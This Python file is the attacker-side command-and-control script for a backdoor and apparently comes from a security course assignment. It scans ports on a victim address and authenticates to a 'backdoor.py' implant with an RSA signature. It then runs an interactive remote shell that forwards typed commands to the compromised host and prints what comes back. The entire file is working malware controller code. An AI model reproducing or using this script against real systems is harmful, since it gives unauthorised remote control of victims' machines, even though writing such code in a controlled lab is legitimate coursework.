from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from aiohttp import web

import socket

INIT_MESSAGE = b'This message will be signed and verified'
BASE_PORT = 1234
VICTIM_IP = '127.0.0.1'

# on the attacker machine
# sending information to the backdoor.py script

# look at the rubric and piazza
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def _authenticate(message = INIT_MESSAGE):
    auth = False
    with open("privkey.pem", "rb") as key_file:
        priv = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
        )
        signature = priv.sign(
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )

        s.send(signature)
        s.send(message)

        success = s.recv(4096)
        auth = success == b'success'
    return auth

def _connect(host = VICTIM_IP, port = BASE_PORT):
    try:
        s.connect((host, port))
    except Exception as e:
        return False
    return True

def find_victim(host = VICTIM_IP, port = BASE_PORT):
    while port < 9999:
        ok = _connect(host, port)
        if ok:
            print(f"[CNCServer] Connected and trying port {port}.")
            ok = _authenticate()
            if ok:
                print(f"[CNCServer] Authenticated succeeded port {port}.")
                break
            else:
                print(f"[CNCServer] Authenticated failed port {port}.")
        port += 1

def remote_shell():
    print("[CNCServer] Starting terminal...")

    while True:
        cmd = input("$: ")
        if(cmd == "exit"):
            s.close()
            break
        else:
            s.send(cmd.encode('utf-8'))
        output = s.recv(4096)
        print(output.decode())

# connect to victim
find_victim()

# write commands to backdoor
remote_shell()

